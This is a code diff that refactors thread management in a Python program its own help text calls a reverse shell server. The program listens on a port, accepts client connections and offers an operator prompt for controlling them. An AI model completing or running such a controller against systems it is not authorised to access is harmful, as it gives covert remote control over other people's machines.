@@ -5,14 +5,6 @@ import os
 import shlex
 import sys, argparse
 
-THREADS = Queue()
-
-
-def kill_threads():  # kills the jobs in order to quit
-    while not THREADS.empty():
-        THREADS.get()
-        THREADS.task_done()
-
 
 class Server:
     def __init__(self, port):
@@ -22,9 +14,27 @@ class Server:
             self.sock.bind(('', self.port))
             self.sock.listen(5)  # will end connection after 5 bad attempts
             self.accepted = []
+            self.threads = Queue()
             print("Listening to port:", self.port)
         except Exception as e:
             raise e
+
+    def run(self):
+        listening_thread = threading.Thread(target=self.listen, daemon=True)
+        ui_thread = threading.Thread(target=self.ui, daemon=True)
+
+        self.threads.put(listening_thread)
+        self.threads.put(ui_thread)
+
+        listening_thread.start()
+        ui_thread.start()
+
+        self.threads.join()
+
+    def kill_threads(self):  # kills the jobs in order to quit
+        while not self.threads.empty():
+            self.threads.get()
+            self.threads.task_done()
 
     def listen(self):
         while True:
@@ -128,7 +138,7 @@ class Server:
             connect = input("->").strip()
             if connect.lower() == "exit":
                 self.send_kill_signal()
-                kill_threads()
+                self.kill_threads()
                 self.sock.close()
                 return
             elif connect.lower() == "help":
@@ -153,31 +163,12 @@ class Server:
                     print("Failed to connect to client!")
 
 
-def return_parser():
+if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="Reverse shell server made by dbc201")
     parser.add_argument("-p", "--port", type=int, dest="port", help="Port the server will connect to")
-    return parser
-
-
-def main(argv):
-    parser = return_parser()
-    args = parser.parse_args(argv)
+    args = parser.parse_args(sys.argv[1:])
     port = 41369
     if args.port:
         port = args.port
     server = Server(port)
-
-    listening_thread = threading.Thread(target=server.listen, daemon=True)
-    ui_thread = threading.Thread(target=server.ui, daemon=True)
-
-    THREADS.put(listening_thread)
-    THREADS.put(ui_thread)
-
-    listening_thread.start()
-    ui_thread.start()
-
-    THREADS.join()
-
-
-if __name__ == "__main__":
-    main(sys.argv[1:])
+    server.run()
